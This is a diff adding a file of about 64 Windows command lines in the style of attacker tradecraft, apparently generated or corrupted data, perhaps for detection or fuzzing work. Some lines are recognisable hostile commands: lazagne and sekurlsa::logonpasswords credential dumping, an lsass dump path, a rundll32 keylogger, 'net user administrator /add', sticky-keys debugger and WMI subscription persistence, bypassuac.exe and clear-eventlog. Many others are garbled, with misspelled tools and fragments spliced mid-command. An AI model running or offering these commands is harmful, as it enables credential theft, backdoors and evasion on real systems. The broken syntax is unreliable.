@@ -1,0 +1,64 @@
+get-ciminstance -classname win32_bios
+lazagne.exe windows
+net localgroup administrators
+[ myprocess ] : objectcategory=computer )
+bitsadmin.exe /create $ { \users\
+net user = `` domain
+net localgroup administrators
+tree
+rundll32 keylogger_dll.dll , keylog
+net localgroup administrators
+sekurlsa : :logonpasswords
+net user administrator /domain
+net start = `` administrators : -l $ { target % :logonpasswords
+net start `` administrators }
+namp -sn $ { weak_service_name } /add
+reg query spooler /v target
+net user administrator /add
+net localgroup administrators
+net user administrator /add
+ipconfig
+net user /add $ { nt\currentversion\winlogon\notify\atomicredteam ''
+net user = `` hklm\system\currentcontrolset\services\winsock2\parameters ''
+copy `` 7 tmp.run 0 tmp.run 0 0 -class processors\atomicredteam '' file execution packages ' % reg_sz /d `` $ service /success ( -class '__filtertoconsumerbinding file -class '__filtertoconsumerbinding file /format '' '' /grant createobject ( `` threadingmodel $ : \windows\temp\lsass_dump.dmp
+stordiag.exe
+psexec \\ profile file ' ;
+get-ciminstance -classname win32_operatingsystem ) -excludeproperty `` '' objectcategory=computer `` get-nettcpconnection
+net user = `` domain
+`` $ target = `` $ target ;
+net user `` $ ( `` = : domain admins '' $ { \users\
+net user administrator /add
+net user $ env `` $ '' volumn name you shortcut = ; ;
+namp -sn $ { filename_regex }
+net user administrator /add
+rdrleakdiag.exe /p volumn name you create = `` keylog
+reg query
+lazagne.exe windows
+reg query hklm\software\microsoft
+namp -sn $ { filename_regex }
+net user = `` $ { shadow shadow copy volumn name you create = set-wmiinstance , set-wmiinstance -namespace 'root/subscription -class file execution options\osk.exe '' /v debugger /d $ { dll_file_path }
+net user = `` `` domain admins '' % @ volumn name } /user set-wmiinstance -namespace 'root/subscription -name set-wmiinstance file execution options\svchost.exe '' \users\
+reg query
+reg add `` hklm\software\microsoft\windows nt\currentversion\image file execution manager\appcertdlls /grant copy `` set-wmiinstance -namespace ' execution \system32\osk.exe
+esentutl.exe /y $ { computer_name }
+net user administrator @ `` $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 -class @ filter = `` $ { shadow appdata % appdata % \system32\osk.exe /grant administrators : = set-wmiinstance ' = set-wmiinstance -namespace execution ' = disabled '' ) ; querylanguage= '' ' ; querylanguage= = createobject ( ``
+wlrmdr.exe -s $ { volumn compression_level off
+adfind.exe -f http : new-object net.webclient ) \\ = $ ( `` clear-eventlog -r /user : \software\microsoft\command set-wmiinstance , keylog
+net group `` `` domain
+python make_image.py $ } ;
+get-localgroup
+net user = `` volumn ;
+net user /add $ { domain
+bitsadmin.exe /active ( `` hklm\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' /t reg_dword /d `` c : inputprovider '' /success : fuzz. $ { microsoft.nodejstools.pressanykey.exe /d 1 /f
+net user = `` \users\
+-exec= $ { filename_regex }
+dumpminitool.exe -- unprivileged -name : \windows\system32\
+ffuf -w $ shortcut $ { filename_regex }
+python os = net.securityprotocoltype ] : -c `` hklm\software\microsoft\windows localappdata ) .historysavepath
+reg `` hkey_local_machine\system\currentcontrolset\control\session localappdata ) -usebasicparsing % \system32\osk.exe
+set win32_group
+net localgroup administrators administrators
+bypassuac.exe `` $ { cim .. exe
+reg query user /server : # { hklm\system\currentcontrolset\services\winsock2\parameters
+net accounts
+python -c `` hkey_current_user\control panel\desktop '' $ )
